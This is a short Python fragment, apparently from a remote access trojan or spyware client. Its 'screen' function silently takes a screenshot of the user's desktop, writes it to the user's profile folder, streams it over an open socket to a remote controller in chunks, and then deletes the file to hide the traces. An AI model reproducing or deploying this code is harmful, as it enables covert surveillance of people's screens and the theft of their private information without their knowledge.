def screen():
    try:
        name = (str(os.getcwd()).split('\\')[2])
        sc = pyautogui.screenshot()
        sc.save(f'C:\\Users\\{name}\\sc.png')
        f = open(f'C:\\Users\\{name}\\sc.png', 'rb')
        while True:
            scbytes = f.read(20480)
            if scbytes == b'':
                s.sendall(b'done')
                f.close()
                os.remove(f'C:\\Users\\{name}\\sc.png')
                break
            else:
                s.sendall(scbytes)
                time.sleep(0.1)
    except OSError:
        s.sendall(b'nono')